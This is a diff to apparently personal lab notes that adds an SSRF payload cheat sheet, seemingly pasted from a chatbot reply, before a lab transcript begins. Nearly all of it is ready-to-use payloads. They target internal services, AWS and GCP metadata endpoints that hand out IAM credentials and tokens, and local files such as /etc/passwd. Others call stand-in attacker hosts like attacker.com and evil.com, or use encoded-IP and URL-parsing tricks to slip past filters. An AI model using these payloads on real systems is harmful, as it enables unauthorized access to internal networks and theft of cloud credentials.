@@ -21,9 +21,149 @@ for the Web page, it's actually taking a screenshot( instead of giving source co
 
 
 
+
+# **SSRF (Server-Side Request Forgery) Payloads**
+
+SSRF vulnerabilities allow attackers to make unauthorized requests from a vulnerable server. Here are some common **SSRF payloads** for different scenarios:
+
 ---
 
+### **1. Basic SSRF to Internal Services**
 
+Try accessing internal resources:
+
+```bash
+http://localhost
+http://127.0.0.1
+http://127.0.0.1:80
+http://localhost:8080/admin
+http://169.254.169.254/latest/meta-data/ # AWS Metadata
+http://192.168.1.1:80 # Internal network
+http://[::1]:80 # IPv6 localhost
+```
+
+---
+
+### **2. DNS-based SSRF**
+
+Redirect to an attacker-controlled domain:
+
+```bash
+http://attacker.com
+http://evil.com
+http://malicious.example.com
+```
+
+Use **Burp Collaborator** or a public request bin:
+
+```bash
+http://burpcollaborator.net
+http://your-requestbin-url.com
+```
+
+---
+
+### **3. File Retrieval SSRF**
+
+```bash
+file:///etc/passwd
+file:///C:/Windows/System32/drivers/etc/hosts
+```
+
+---
+
+### **4. SSRF to Cloud Services**
+
+#### **AWS Metadata Service**
+
+```bash
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/admin
+```
+
+#### **Google Cloud Metadata API**
+
+```bash
+http://metadata.google.internal/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+```
+
+#### **Azure Metadata API**
+
+```bash
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+```
+
+---
+
+### **5. SSRF via Open Redirect**
+
+If an application follows redirects:
+
+```bash
+http://yourdomain.com/redirect?url=http://attacker.com
+http://yourdomain.com/redirect?next=http://169.254.169.254/latest/meta-data/
+```
+
+---
+
+### **6. SSRF via Port Scanning**
+
+Check for open ports on internal network:
+
+```bash
+http://127.0.0.1:22 # SSH
+http://127.0.0.1:3306 # MySQL
+http://127.0.0.1:6379 # Redis
+http://127.0.0.1:5000 # Flask apps
+```
+
+---
+
+### **7. Bypassing SSRF Protections**
+
+#### **Using `@` to bypass filtering**
+
+```bash
+http://127.0.0.1@attacker.com
+```
+
+#### **Using `#` or `?` to break URL parsing**
+
+```bash
+http://127.0.0.1#attacker.com
+http://169.254.169.254/?redirect=evil.com
+```
+
+#### **Using `localhost` variations**
+
+```bash
+http://2130706433/ # Decimal format of 127.0.0.1
+http://0x7f000001/ # Hex format
+http://017700000001/ # Octal format
+```
+
+---
+
+### **8. Exploiting SSRF for RCE**
+
+If an application processes fetched data, SSRF can lead to **Remote Code Execution (RCE)**:
+
+```bash
+http://127.0.0.1:8000/?cmd=id
+http://127.0.0.1:8080/shell?command=whoami
+```
+
+---
+
+Let me know if you need specific payloads for a particular scenario! 🚀
+
+
+
+---
+
+# Transcript of lab: 
 
 1
 00:00:00,090 --> 00:00:04,170
